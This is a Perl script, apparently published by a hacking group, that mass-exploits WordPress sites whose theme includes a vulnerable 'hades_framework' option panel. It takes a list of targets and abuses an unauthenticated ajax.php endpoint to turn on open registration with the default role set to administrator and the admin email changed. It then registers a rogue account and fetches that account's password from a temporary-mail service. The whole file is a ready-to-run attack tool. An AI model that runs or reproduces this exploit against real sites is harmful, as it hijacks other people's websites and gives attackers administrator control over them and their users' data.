#!/usr/bin/perl -w
# Coded By M-A
# Greet's : My Brother Rab3oun & Boy & All Sec4ever Menber 
# (c) Jannissaries.org & Sec4ever.com 
# Perl Lov3r :)
use strict;
use HTTP::Request;
use Digest::MD5;
use LWP::UserAgent;
use URI::Split qw/ uri_split uri_join /;
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
flag();
 
my $useragent = randomagent();#Get a Random User Agent 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
$ua->cookie_jar({});# Cookies
$ua->timeout(10);#Time out = 10 you can change it 
$ua->agent($useragent);#agent type
 
print "\n[+] Enter List Of Target : ";
chomp (my $list=<>);
my $user = Generate_user();
chomp ($user);
my $mail = $user.'@flurred.com';
print "[+] Started : $datestring\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test \n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
    print "[$i] $web \n";
    Work($web);#exploiting website :)
}
 
sub Work {
    print "[Testing] $_[0] \n\n";
    my $theme = get_theme($_[0]);
    print "[Yes] Theme Obtained\n";
    my $x= $_[0]."/wp-content/themes/".$theme."/hades_framework/option_panel/ajax.php";
    my $r = $ua->get($x);
    my $xheader = $r->headers()->as_string;
    #print $xheader;
    my $html = $r->content;
    #print "\n\n$html";
    my $e = length($html);
    if ($r->is_success || $e eq 0) {
        print "[Yes] Target Infected\n";
        Exp($x);
    }
    elsif ($e eq 0){
        print "[!] Forbiden 404\n\n"
    }
    else {
        print "[!] Target Not Infected\n\n"
    }
}
sub get_theme {
        my $request = HTTP::Request->new(GET=>$_[0]);
        my $response = $ua->request($request);
        if ($response->content=~/wp-content\/themes\/(.*?)\//g){
        $1;
        }
}
sub clean {
my $scheme_host = do {
  my (@parts) = uri_split $_[0];
  uri_join @parts[0,1];
};
}
 
sub Exp {
    my $search = $ua->post ($_[0],
    Content => ["values[0][name]" =>"users_can_register","values[0][value]" =>"1",
    "values[1][name]" =>"admin_email",
    "values[1][value]" => $mail,
    "values[2][name]" =>"default_role",
    "values[2][value]" =>"administrator",
    "action" => "save",
    "submit" => "submit",]);
    #print $search->content;
    if ($search->content=~/success/) {
        print "[OK]  Payload successfully executed\n";
        my $web=clean($_[0]);
        Exploiting($web);
    }
    else {print "[No]  Faild To Execute Payload \n\n";}
}
# Exploiting -> Creating New Admin Account
sub Exploiting {
    my $y = $_[0]."/wp-login.php?action=register";
    my $regex = '<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*?)" /></p>';
    my $xx = $ua->get ($y);
    if ($xx->content=~/$regex/){
        if (defined $1){
            my $reg_value = $1;
            my $post = $ua->post($y,
            {
            "user_login" => $user,
            "user_email" => $mail,
            "redirect_to" => "",
            "wp-submit" => $reg_value,
            });
            if (length($post->content) eq 0 || $post->code eq 302) {
                print "[d0ne] Account Successfully Created \n";
                print "[!] User : $user \n";
                print "[!] mail : $mail \n";
                my $md5 = Digest::MD5->new;
                $md5->add($mail);
                my $digest = $md5->hexdigest."\n\n";
                my $target = "http://api.temp-mail.ru/request/mail/id/".$digest."/format/json";
                my $SS = $ua->get ($target)->content;
                if ($SS=~/\\nPassword: (.*?)\\/){
                print "[!] Password : $1 \n\n";
                } 
            }
            else {print "[No] Error Creating Account \n\n";}
        }
        else {
            print "[No] Can't get register value try to make it manually\n";
            print "[.] To registre :\n";
            print " -> $y\n\n";
        }
    }
}
# Generate random user :)
sub Generate_user {
my $rndstr = rndstr(6, 1..9, 'a'..'z');
sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
}
# Flag
sub flag {
    print q{
 █████╗ ██████╗ ██████╗      █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
███████║██║  ██║██║  ██║    ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
██╔══██║██║  ██║██║  ██║    ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
██║  ██║██████╔╝██████╔╝    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
╚═╝  ╚═╝╚═════╝ ╚═════╝     ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                   0day - v1 & cod3d by Mr_AnarShi-T
                        (c) Sec4ever.com/home
                     Greet's My l4b & Rb3oun & b0y
                    
    };
}